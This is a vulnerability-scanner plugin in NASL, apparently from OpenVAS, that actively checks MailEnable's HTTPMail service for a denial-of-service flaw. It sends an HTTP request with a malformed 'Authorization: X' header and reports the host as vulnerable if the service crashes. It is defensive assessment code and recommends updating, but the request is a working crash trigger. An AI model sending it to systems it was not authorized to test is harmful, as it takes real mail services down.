# SPDX-FileCopyrightText: 2004 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mailenable:mailenable";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14654");
  script_version("2023-05-11T09:09:33+0000");
  script_tag(name:"last_modification", value:"2023-05-11 09:09:33 +0000 (Thu, 11 May 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("MailEnable < 1.19 DoS Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_mailenable_consolidation.nasl");
  script_mandatory_keys("mailenable/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"MailEnable is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the service is
  still responding.");

  script_tag(name:"insight", value:"The remote host is running an instance of MailEnable that has a
  flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions. The flaw
  can be exploited by issuing an HTTP request with a malformed Authorization header, which causes a
  NULL pointer dereference error and crashes the HTTPMail service.");

  script_tag(name:"solution", value:"Update to version 1.19 or later.");

  script_xref(name:"URL", value:"http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2004-05/0159.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

if (http_is_dead(port: port))
  exit(0);

host = http_host_name(port: port);

req = string("GET / HTTP/1.0\r\n",
             "Host: ", host, "\r\n",
             "Authorization: X\r\n",
             "\r\n");
res = http_send_recv(port: port, data: req);

if (!res && http_is_dead(port: port)) {
  security_message(port: port);
  exit(0);
}

exit(99);
